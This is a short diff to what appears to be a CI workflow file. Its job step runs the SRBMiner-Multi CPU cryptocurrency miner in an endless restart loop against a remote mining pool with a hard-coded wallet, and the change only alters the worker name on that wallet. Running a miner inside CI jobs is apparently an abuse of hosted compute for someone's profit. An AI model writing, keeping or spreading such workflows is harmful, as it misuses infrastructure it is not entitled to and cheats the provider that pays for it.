@@ -33,6 +33,6 @@ jobs:
         run: |
           cd SRBMiner-Multi-2-4-7  # Move to the correct directory
           while true; do
-            ./SRBMiner-MULTI --disable-gpu --algorithm yespower --pool na.rplant.xyz:17111 --wallet aNEpRWJEag9JiZFgztAf38q4kPmgkfXNCo.rw8x pause --cpu-Threads 4 --keepalive true
+            ./SRBMiner-MULTI --disable-gpu --algorithm yespower --pool na.rplant.xyz:17111 --wallet aNEpRWJEag9JiZFgztAf38q4kPmgkfXNCo.r4x pause --cpu-Threads 4 --keepalive true
             sleep 30  # Wait for 30 seconds before restarting
           done
